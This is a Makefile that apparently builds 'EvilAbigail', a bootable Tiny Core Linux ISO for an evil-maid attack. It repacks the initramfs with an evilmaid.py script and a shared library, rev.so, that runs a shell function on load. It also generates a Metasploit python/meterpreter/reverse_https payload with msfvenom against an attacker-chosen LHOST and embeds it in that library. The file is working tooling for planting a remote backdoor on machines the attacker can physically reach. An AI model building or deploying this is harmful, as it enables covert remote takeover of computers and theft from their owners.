.PHONY: all build iso clean FORCE
# run with LHOST=w.x.y.z
FILENAME=hda1
WAIT=90
CFLAGS+=-shared -Wall -Werror -fpic -Wl,-init,shell -std=c99 -DWAIT=$(WAIT) -DFILENAME="\"$(FILENAME)\""
CC=gcc

all: iso
build: rev.so
iso: EvilAbigail.iso
clean:
	rm -f core.d/evilmaid.py core.d/rev.so core.gz EvilAbigail.iso .lhost payload.h rev.so
FORCE:

core.d/%: % # evilmaid.py: evilmaid.py
	sudo cp $(@F) $@

core.d/rev.so: rev.so
	sudo cp $< core.d/$(FILENAME)

core.gz: core.d core.d/evilmaid.py core.d/rev.so
	cd core.d && sudo find . -mindepth 1 | cut -c3- | sudo cpio -o -H newc --quiet | gzip > ../$@

Core-current/boot/core.gz: core.gz | Core-current/boot
	sudo cp core.gz $@

EvilAbigail.iso: Core-current Core-current/boot/core.gz Core-current/boot/isolinux/isolinux.bin Core-current/boot/isolinux/boot.cat
	@rm -f $@
	sudo mkisofs -l -J -R -V TC-custom -input-charset utf8 -no-emul-boot -boot-load-size 4 -boot-info-table -b boot/isolinux/isolinux.bin -c boot/isolinux/boot.cat -quiet -o $@ Core-current

Core-current: | Core-current.iso
	${error Copy the contents of Core-current.iso into Core-current}

core.d:
	@mkdir -p core.d
	@cd core.d && gunzip -c ../Core-current/boot/core.gz | sudo cpio -id --quiet

.lhost: FORCE
ifeq (${strip $(LHOST)},)
	${error Please specify LHOST}
endif
	@echo $(LHOST) > $@.tmp
	@cmp -s $@ $@.tmp || mv $@.tmp $@
	@rm -f $@.tmp

payload.h: .lhost
	msfvenom -f raw -p python/meterpreter/reverse_https LHOST=$(LHOST) 2>/dev/null | sed 's/^/\#define PAYLOAD "/;s/$$/"\n/' > $@

rev.so: payload.h
%.so: %.c
	$(CC) $(CFLAGS) $< -o $@

%.tcz:
	wget http://distro.ibiblio.org/tinycorelinux/6.x/x86/tcz/$(@F)
